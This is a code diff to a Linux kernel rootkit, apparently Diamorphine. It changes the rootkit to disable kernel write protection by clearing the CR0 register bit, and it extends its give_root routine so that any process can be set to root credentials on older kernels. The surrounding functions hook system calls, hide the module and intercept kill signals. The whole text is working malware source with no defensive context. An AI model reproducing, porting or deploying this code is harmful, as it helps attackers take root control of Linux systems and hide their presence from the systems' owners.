@@ -3,7 +3,6 @@
 #include <linux/module.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
-#include <linux/fdtable.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
@@ -11,9 +10,15 @@
 #else
 	#include <linux/proc_fs.h>
 #endif
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
+	#include <linux/file.h>
+#else
+	#include <linux/fdtable.h>
+#endif
+
 #include "diamorphine.h"
 
-static pte_t *pte;
+unsigned long cr0;
 static unsigned long *sys_call_table;
 typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
 	unsigned int);
@@ -169,25 +174,31 @@ out:
 void
 give_root(void)
 {
-	struct cred *newcreds;
-	newcreds = prepare_creds();
-	if (newcreds == NULL)
-		return;
-	
-	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
-		&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
-		|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
-		newcreds->uid.val = newcreds->gid.val = 0;
-		newcreds->euid.val = newcreds->egid.val = 0;
-		newcreds->suid.val = newcreds->sgid.val = 0;
-		newcreds->fsuid.val = newcreds->fsgid.val = 0;
+	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+		current->uid = current->gid = 0;
+		current->euid = current->egid = 0;
+		current->suid = current->sgid = 0;
+		current->fsuid = current->fsgid = 0;
 	#else
-		newcreds->uid = newcreds->gid = 0;
-		newcreds->euid = newcreds->egid = 0;
-		newcreds->suid = newcreds->sgid = 0;
-		newcreds->fsuid = newcreds->fsgid = 0;
+		struct cred *newcreds;
+		newcreds = prepare_creds();
+		if (newcreds == NULL)
+			return;
+		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
+			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
+			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
+			newcreds->uid.val = newcreds->gid.val = 0;
+			newcreds->euid.val = newcreds->egid.val = 0;
+			newcreds->suid.val = newcreds->sgid.val = 0;
+			newcreds->fsuid.val = newcreds->fsgid.val = 0;
+		#else
+			newcreds->uid = newcreds->gid = 0;
+			newcreds->euid = newcreds->egid = 0;
+			newcreds->suid = newcreds->sgid = 0;
+			newcreds->fsuid = newcreds->fsgid = 0;
+		#endif
+		commit_creds(newcreds);
 	#endif
-	commit_creds(newcreds);
 }
 
 static inline void
@@ -252,15 +263,13 @@ hacked_kill(pid_t pid, int sig)
 static inline void
 protect_memory(void)
 {
-	/* Restore kernel memory page protection */
-	set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
+	write_cr0(cr0);
 }
 
 static inline void
 unprotect_memory(void)
 {
-	/* Unprotected kernel memory page containing for writing */
-	set_pte_atomic(pte, pte_mkwrite(*pte));
+	write_cr0(cr0 & ~0x00010000);
 }
 
 static int __init
@@ -272,9 +281,7 @@ diamorphine_init(void)
 	if (!sys_call_table)
 		return -1;
 
-	pte = lookup_address((unsigned long)sys_call_table, &level);
-	if (!pte)
-		return -1;
+	cr0 = read_cr0();
 
 	module_hide();
 	tidy();
